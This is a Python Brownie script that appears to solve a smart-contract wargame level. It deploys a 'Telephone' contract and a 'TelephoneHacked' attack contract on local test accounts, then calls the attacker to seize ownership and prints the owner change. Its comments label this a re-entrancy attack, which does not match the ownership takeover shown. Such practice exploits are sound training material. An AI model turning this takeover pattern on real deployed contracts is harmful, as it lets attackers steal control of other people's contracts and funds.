import os
from brownie import *
from web3 import Web3

def deploy_telephone(owr, usr1):
    # deploy telf
    tlf = Telephone.deploy({'from':owr})
    # deploy telehack
    tlfh = TelephoneHacked.deploy(tlf.address, {'from': usr1})

    return tlf, tlfh

def reenter(tlf, tlfh, usr1):
    # store initial owner
    previous_owner = tlf.owner()
    # reenter
    tlfh.getOwnership(usr1.address, {'from':usr1})
    # store new ownership
    new_owner = tlf.owner()
    # print swap of ownerships
    print("[*] Previous owner",previous_owner)
    print("[*] New owner", new_owner)

def main():
    # get accounts
    owner = accounts[0]
    user1 = accounts[1]
    # deploy contracts - Telephone and Telehacked
    tlf, tlfh = deploy_telephone(owner, user1)
    # re-entrancy attack
    reenter(tlf, tlfh, user1)